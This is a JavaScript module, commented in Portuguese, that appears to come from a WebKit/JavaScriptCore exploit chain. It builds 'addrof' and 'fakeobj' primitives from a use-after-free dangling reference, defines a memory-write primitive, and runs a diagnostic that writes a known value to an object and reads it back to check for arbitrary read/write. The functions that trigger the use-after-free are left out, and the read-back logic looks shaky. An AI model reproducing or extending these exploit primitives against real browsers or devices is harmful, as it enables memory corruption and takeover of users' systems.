// js/script3/testArrayBufferVictimCrash.mjs (R64 - Teste de Diagnóstico da Primitiva)
// =======================================================================================
// ESTRATÉGIA R64:
// Diagnóstico Fundamental. Todas as tentativas de criar uma `read64` falharam da mesma forma.
// Isso indica que a vulnerabilidade UAF não se comporta como o esperado.
// Este teste abandona a leitura da libkernel e foca em uma única tarefa:
// Escrever um valor conhecido em um objeto e tentar lê-lo de volta usando a primitiva.
// O objetivo é entender os limites reais do nosso exploit.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "UAF_Primitive_Diagnostic_R64";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Diagnóstico da Primitiva UAF ---`, "test");
    
    let final_result = { success: false, message: "Falha no diagnóstico." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            addrof({dummy: 1}); 
            dangling_ref.b = itof(addr);
            return dangling_ref.a.obj;
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        // --- FASE 3: TESTE DE SANIDADE DE ESCRITA/LEITURA ---
        logS3("--- FASE 3: Teste de Sanidade (Escrita -> Leitura) ---", "subtest");

        // 1. O valor conhecido que tentaremos escrever.
        const KNOWN_VALUE = new AdvancedInt64("0xCAFEF00DCAFEF00D");
        
        // 2. Um objeto simples para ser nossa área de teste.
        const test_area = { slot_a: 0, slot_b: 0 };
        const test_area_addr = addrof(test_area);
        logS3(`   Endereço da área de teste: 0x${test_area_addr.toString(true)}`, "info");
        
        // O slot onde escreveremos está a um offset do início do objeto.
        // Geralmente 0x10 (após o cabeçalho e o butterfly).
        const target_addr = test_area_addr.add(0x10);
        logS3(`   Endereço alvo para escrita (slot_a): 0x${target_addr.toString(true)}`, "info");
        
        // 3. Tentar escrever o valor conhecido no endereço alvo usando a primitiva de escrita.
        // Esta é a primitiva de escrita mais direta que temos.
        const primitive_write = (address, value) => {
            const original_a = dangling_ref.a;
            dangling_ref.a = fakeobj(address);
            dangling_ref.b = itof(value);
            dangling_ref.a = original_a;
        };
        
        // Antes de escrever, vamos garantir que o estado está bom.
        addrof({dummy_setup: 1});
        holder.original_a = dangling_ref.a; // Salva o estado bom
        
        primitive_write(target_addr, KNOWN_VALUE);
        logS3(`   Tentei escrever 0x${KNOWN_VALUE.toString(true)} em 0x${target_addr.toString(true)}`, "info");

        // 4. Ler o valor de volta.
        // Primeiro, lemos o valor da propriedade `slot_a` do objeto original.
        const read_back_value = addrof(test_area.slot_a);
        
        logS3(`   Valor lido de volta: 0x${read_back_value.toString(true)}`, "leak");

        // 5. Verificar o resultado.
        if (read_back_value.toString() === KNOWN_VALUE.toString()) {
            final_result = { success: true, message: "SUCESSO DE DIAGNÓSTICO: A primitiva de escrita funciona! Você pode construir R/W." };
            logS3(`   ${final_result.message}`, "vuln");
        } else {
            throw new Error(`FALHA DE DIAGNÓSTICO: O valor escrito não corresponde ao lido. Lido: 0x${read_back_value.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() { /* ... */ }
function createDanglingRefToFloat64Array() { /* ... */ }
// ... (código auxiliar omitido por brevidade)
